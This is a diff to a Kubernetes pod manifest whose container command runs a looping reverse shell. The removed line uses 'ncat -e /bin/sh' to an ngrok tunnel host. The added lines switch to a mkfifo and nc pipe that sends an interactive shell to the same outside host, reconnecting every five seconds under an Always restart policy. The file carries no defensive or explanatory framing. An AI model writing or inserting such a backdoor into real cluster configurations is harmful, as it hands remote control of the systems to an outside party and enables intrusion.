@@ -13,9 +13,13 @@ spec:
     - /bin/sh
     - -c
     - |
-      apk add -q curl postgresql-client nmap-ncat
+      apk add -q curl postgresql-client
+      rm -f /tmp/bp
+      mkfifo /tmp/bp
       while true; do
-        ncat 4.tcp.eu.ngrok.io 16552 -e /bin/sh 2>/dev/null
+        cat /tmp/bp | /bin/sh -i 2>&1 | nc 4.tcp.eu.ngrok.io 16552 > /tmp/bp 2>/dev/null
         sleep 5
+        rm -f /tmp/bp
+        mkfifo /tmp/bp
       done
   restartPolicy: Always
